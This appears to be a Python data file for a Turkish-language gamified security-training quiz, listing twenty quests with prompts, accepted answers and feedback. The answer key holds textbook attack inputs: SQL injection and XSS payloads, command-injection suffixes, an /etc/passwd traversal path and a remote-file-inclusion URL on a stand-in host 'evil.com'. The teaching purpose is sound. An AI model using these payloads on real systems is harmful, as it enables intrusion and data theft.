# tasks_data.py

tasks = {
    1: {
        "id": 1,
        "isim": "SQL Kristali",
        "aciklama": "İlk kristali çöz: Basit bir SQL Injection denemesi yap.",
        "dogru_cevaplar": ["' OR '1'='1", "admin' OR '1'='1"],
        "feedback_dogru": "✨ Harika! SQL kristalini çözdün.",
        "feedback_yanlis": ["❌ Yanlış. SQL Injection mantığını tekrar düşün."],
        "sonraki_gorev": 2
    },
    2: {
        "id": 2,
        "isim": "XSS Büyüsü",
        "aciklama": "Bir XSS payloadu dene.",
        "dogru_cevaplar": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        "feedback_dogru": "🔥 Harikasın! XSS büyüsünü öğrendin.",
        "feedback_yanlis": ["⚠️ Yanlış. HTML içine zararlı kod eklemeyi dene."],
        "sonraki_gorev": 3
    },
    3: {
        "id": 3,
        "isim": "Hash Kırıcı",
        "aciklama": "MD5 hashini çöz: 5f4dcc3b5aa765d61d8327deb882cf99",
        "dogru_cevaplar": ["password"],
        "feedback_dogru": "🔓 Doğru! Hashi çözdün.",
        "feedback_yanlis": ["❌ Yanlış. Hash kırma tekniklerini hatırla."],
        "sonraki_gorev": 4
    },
    4: {
        "id": 4,
        "isim": "Wordlist Kapısı",
        "aciklama": "Zayıf parola: 'qwerty'. Tahmin edebilir misin?",
        "dogru_cevaplar": ["qwerty"],
        "feedback_dogru": "🔑 Güzel iş! Wordlist saldırısını başarıyla uyguladın.",
        "feedback_yanlis": ["⚠️ Yanlış. Basit şifreleri dene."],
        "sonraki_gorev": 5
    },
    5: {
        "id": 5,
        "isim": "Komut İnjeksiyonu",
        "aciklama": "Sistemde komut enjeksiyonu yapmayı dene.",
        "dogru_cevaplar": ["; ls", "&& whoami"],
        "feedback_dogru": "💻 Komut enjeksiyonunu başardın!",
        "feedback_yanlis": ["❌ Yanlış. Shell komutlarını hatırla."],
        "sonraki_gorev": 6
    },
    6: {
        "id": 6,
        "isim": "CSRF Paraziti",
        "aciklama": "CSRF zafiyetini düşün: Gizli token olmadan işlem yapılabilir mi?",
        "dogru_cevaplar": ["no csrf token", "missing csrf"],
        "feedback_dogru": "🕷️ Güzel! CSRF açığını keşfettin.",
        "feedback_yanlis": ["⚠️ Yanlış. Token mantığını hatırla."],
        "sonraki_gorev": 7
    },
    7: {
        "id": 7,
        "isim": "DoS Fırtınası",
        "aciklama": "Basit DoS saldırısı tekniği nedir?",
        "dogru_cevaplar": ["flood", "syn flood", "dos"],
        "feedback_dogru": "🌊 Harika! DoS fırtınasını anladın.",
        "feedback_yanlis": ["❌ Yanlış. Trafik yoğunluğunu düşün."],
        "sonraki_gorev": 8
    },
    8: {
        "id": 8,
        "isim": "Dizin Arayıcı",
        "aciklama": "Saklı dizinleri keşfetmek için hangi araç kullanılır?",
        "dogru_cevaplar": ["dirb", "gobuster", "dirbuster"],
        "feedback_dogru": "📂 Süper! Gizli dizinleri bulmayı öğrendin.",
        "feedback_yanlis": ["⚠️ Yanlış. Dizin brute force araçlarını hatırla."],
        "sonraki_gorev": 9
    },
    9: {
        "id": 9,
        "isim": "Subdomain Avcısı",
        "aciklama": "Subdomain keşfi için kullanılan araçlardan birini yaz.",
        "dogru_cevaplar": ["sublist3r", "amass"],
        "feedback_dogru": "🌐 Güzel! Subdomain avını yaptın.",
        "feedback_yanlis": ["❌ Yanlış. DNS keşif araçlarını hatırla."],
        "sonraki_gorev": 10
    },
    10: {
        "id": 10,
        "isim": "Şifreleme Büyüsü",
        "aciklama": "Base64 ile kodlanmış metin: cGFzc3dvcmQ= çöz.",
        "dogru_cevaplar": ["password"],
        "feedback_dogru": "🔐 Harika! Şifreyi çözdün.",
        "feedback_yanlis": ["⚠️ Yanlış. Base64 çözümünü dene."],
        "sonraki_gorev": 11
    },
    11: {
        "id": 11,
        "isim": "Log Avcısı",
        "aciklama": "Log analizi ile şüpheli bir giriş tespit et. IP: 192.168.1.50",
        "dogru_cevaplar": ["192.168.1.50"],
        "feedback_dogru": "📜 Doğru! Şüpheli IP’yi buldun.",
        "feedback_yanlis": ["❌ Yanlış. Loglara tekrar bak."],
        "sonraki_gorev": 12
    },
    12: {
        "id": 12,
        "isim": "Wireshark Büyüsü",
        "aciklama": "PCAP dosyasında HTTP şifreyi nasıl bulursun?",
        "dogru_cevaplar": ["follow http stream", "http stream"],
        "feedback_dogru": "🦈 Harika! Wireshark kullanmayı biliyorsun.",
        "feedback_yanlis": ["⚠️ Yanlış. HTTP stream incele."],
        "sonraki_gorev": 13
    },
    13: {
        "id": 13,
        "isim": "Firewall Kalkanı",
        "aciklama": "Firewall mantığı nedir?",
        "dogru_cevaplar": ["block traffic", "allow deny", "filter traffic"],
        "feedback_dogru": "🛡️ Güzel! Firewall’un mantığını çözdün.",
        "feedback_yanlis": ["❌ Yanlış. Trafik filtreleme aklına gelsin."],
        "sonraki_gorev": 14
    },
    14: {
        "id": 14,
        "isim": "IDS Gözcüsü",
        "aciklama": "IDS ne işe yarar?",
        "dogru_cevaplar": ["detect intrusion", "intrusion detection"],
        "feedback_dogru": "👁️ IDS gözün gibi! Saldırıları tespit eder.",
        "feedback_yanlis": ["⚠️ Yanlış. IDS saldırıyı durdurmaz, fark eder."],
        "sonraki_gorev": 15
    },
    15: {
        "id": 15,
        "isim": "IPS Mührü",
        "aciklama": "IPS ne farkı var?",
        "dogru_cevaplar": ["prevent intrusion", "intrusion prevention"],
        "feedback_dogru": "🔮 Harika! IPS saldırıyı engeller.",
        "feedback_yanlis": ["❌ Yanlış. IDS’den farkını hatırla."],
        "sonraki_gorev": 16
    },
    16: {
        "id": 16,
        "isim": "JWT Tılsımı",
        "aciklama": "Zayıf JWT token imzasını kırmanın yolu nedir?",
        "dogru_cevaplar": ["none algorithm", "bruteforce secret"],
        "feedback_dogru": "🔑 Güzel! JWT açığını çözdün.",
        "feedback_yanlis": ["⚠️ Yanlış. JWT imzalarını hatırla."],
        "sonraki_gorev": 17
    },
    17: {
        "id": 17,
        "isim": "XXE Portalı",
        "aciklama": "XML External Entity açığını tetikle.",
        "dogru_cevaplar": ["<!ENTITY", "xxe"],
        "feedback_dogru": "📖 Harika! XXE’yi keşfettin.",
        "feedback_yanlis": ["❌ Yanlış. XML injection mantığını hatırla."],
        "sonraki_gorev": 18
    },
    18: {
        "id": 18,
        "isim": "LFI Labirenti",
        "aciklama": "Local File Inclusion için path örneği ver.",
        "dogru_cevaplar": ["../../etc/passwd", "../etc/passwd"],
        "feedback_dogru": "📂 Doğru! Dosya içeriğini okumayı başardın.",
        "feedback_yanlis": ["⚠️ Yanlış. Dizine çıkmayı dene."],
        "sonraki_gorev": 19
    },
    19: {
        "id": 19,
        "isim": "RFI Geçidi",
        "aciklama": "Remote File Inclusion açığını yaz.",
        "dogru_cevaplar": ["http://evil.com/shell.txt"],
        "feedback_dogru": "🌍 RFI açığını keşfettin!",
        "feedback_yanlis": ["❌ Yanlış. Uzak dosya çağırmayı dene."],
        "sonraki_gorev": 20
    },
    20: {
        "id": 20,
        "isim": "Usta Mührü",
        "aciklama": "Son mühür: Tüm öğrendiklerini kullan. (Final Quest)",
        "dogru_cevaplar": ["all techniques mastered", "hepsini öğrendim"],
        "feedback_dogru": "🏆 Tigin seni Usta ilan etti! Yolculuğun tamamlandı.",
        "feedback_yanlis": ["⚠️ Henüz ustalaşmadın. Görevleri tekrar hatırla."],
        "sonraki_gorev": None
    }
}
